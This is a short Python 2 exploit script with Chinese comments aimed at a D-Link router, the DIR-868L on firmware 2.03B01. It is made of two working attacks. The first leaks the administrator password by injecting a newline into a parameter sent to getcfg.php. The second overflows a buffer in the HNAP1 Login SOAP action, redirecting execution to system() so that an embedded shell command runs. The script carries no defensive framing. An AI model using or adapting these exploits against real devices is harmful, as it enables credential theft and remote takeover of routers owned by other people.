import requests
import struct

# 泄露路由器管理员密码
url = 'http://192.168.0.1/getcfg.php'
p = {'a': 'b\nAUTHORIZED_GROUP=0'}
d = {'SERVICES': 'DEVICE.ACCOUNT'}
print requests.post(url, params=p, data=d).text


# 任意代码执行
def _str(address):
    return struct.pack("<I", address) if address > 0 else struct.pack("<i", address)

url = 'http://192.168.0.1:80/HNAP1/'
headers_text = {
    'SOAPACTION' : 'http://purenetworks.com/HNAP1/Login',
    'CONTENT-TYPE' : 'text/html'
}

SYSTEM_ADDRESS = 0x1ABAC	# DIR-868L_REVB_FIRMWARE_2.03B01 
payload = b"killall httpd;" # 待执行的命令
data = b"<Action>" + payload + b"A" * (0x400 - len(payload)) + _str(-1) + b"C" * 0x14 + _str(SYSTEM_ADDRESS)[0:3] + b"</Action>"

print requests.post(url, data=data, headers=headers_text).text